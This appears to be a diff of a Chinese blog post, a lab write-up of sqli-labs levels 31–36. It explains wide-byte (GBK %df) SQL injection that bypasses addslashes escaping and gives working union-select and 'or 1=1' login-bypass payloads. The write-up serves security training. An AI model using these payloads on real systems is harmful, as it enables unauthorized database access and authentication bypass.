@@ -254,7 +254,41 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前一部分链接：第21-30关Write-up"><a href="#前一部分链接：第21-30关Write-up" class="headerlink" title="前一部分链接：第21-30关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></h3><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2>
+        <h3 id="前一部分链接：第21-30关Write-up"><a href="#前一部分链接：第21-30关Write-up" class="headerlink" title="前一部分链接：第21-30关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></h3><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><p>Less-32,33,34,35,36,37六关全部是针对<code>’</code>和<code>\</code>的过滤，所以我们放在一起来进行讨论。</p>
+<p>对宽字节注入的同学应该对这几关的bypass方式应该比较了解。我们在此介绍一下宽字节注入的原理和基本用法。</p>
+<p>原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思路是将 ‘ 转换为<code>\’</code>（转换的函数或者思路会在每一关遇到的时候介绍）。<br>因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路：</p>
+<p>1.%df吃掉 \   具体的原因是urlencode(‘)  = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</p>
+<p>2.将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</p>
+<h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>我们提交以下payload时，发现<code>单引号&#39;</code>被转义了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/2-1.png" alt="2-1"></p>
+<p>查看源码，发现使用了<code>check_addslashes()</code>函数对id进行了处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id=check_addslashes($_GET[&apos;id&apos;]);</span><br></pre></td></tr></table></figure>
+<p>看一下这个函数的功能，就是对<code>反斜杠</code>\、<code>单引号</code>‘、<code>双引号</code>“的过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>源码中设置mysql使用<code>GBK</code>编码，那这里就可以使用<code>%df</code>来把<code>反斜杠\</code>给吃掉</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">"SET NAMES gbk"</span>);</span><br></pre></td></tr></table></figure>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/2-2.png" alt="2-2"></p>
+<h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><p>本关与前一关不一样的是，对id的处理使用了<code>addslashes()</code>函数</p>
+<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
+<p>预定义字符是：</p>
+<p>单引号（’）双引号（”）反斜杠（\）</p>
+<p>提示：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么这个函数的功能和前一关的函数功能是一样的，所以也可以使用一样的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df%27 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><p>本关的参数改成通过<code>POST</code>方式提交，但是对参数的处理没有变，同样是<code>addslashes()</code>函数</p>
+<p>不一样的是，通过输入框传入的参数浏览器不会解码，所以这里不能像之前那样直接填%df%27，直接填经过<code>URL编码</code>过后的：<code>�&#39;</code></p>
+<p>所以用户名填：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">�&apos; or 1=1 #</span><br></pre></td></tr></table></figure>
+<p>密码随意</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/31-40/4-1.png" alt="4-1"></p>
+<h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><p>本关直接就是<code>整数型注入</code>，参数<code>id</code>没有单引号包裹，刚开始没注意还被搞混了</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 #</span><br></pre></td></tr></table></figure>
+<h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2>
       
 
       
@@ -410,7 +444,7 @@
 <h2 id="Less-29至31"><a href="#Less-29至31" class="headerlink" title="Less-29至31"></a>Less-29至31</h2><p>这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。</p>
 <p>开始看这题并没有发现index.php有WAF，后来发现原来是index.jsp用了WAF，关键代码如下。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String id = request.getParameter(<span class="string">"id"</span>);</span><br><span class="line">    String qs = request.getQueryString();</span><br><span class="line">    String rex = <span class="string">"^\\d+$"</span>;</span><br><span class="line">    Boolean match=id.matches(rex);</span><br><span class="line">    <span class="keyword">if</span>(match == <span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        URL sqli_labs = <span class="keyword">new</span> URL(<span class="string">"http://localhost/sqli-labs/Less-29/index.php?"</span>+ qs);</span><br><span class="line">        URLConnection sqli_labs_connection = sqli_labs.openConnection();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="后一部分链接：第11-20关Write-up"><a href="#后一部分链接：第11-20关Write-up" class="headerlink" title="后一部分链接：第11-20关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第11-20关Write-up</a></h3>
+<h3 id="后一部分链接：第31-40关Write-up"><a href="#后一部分链接：第31-40关Write-up" class="headerlink" title="后一部分链接：第31-40关Write-up"></a>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/30/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></h3>
       
 
       
@@ -1453,11 +1487,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF加密</a>
               </li>
              
               <li class="article-tag-list-item">
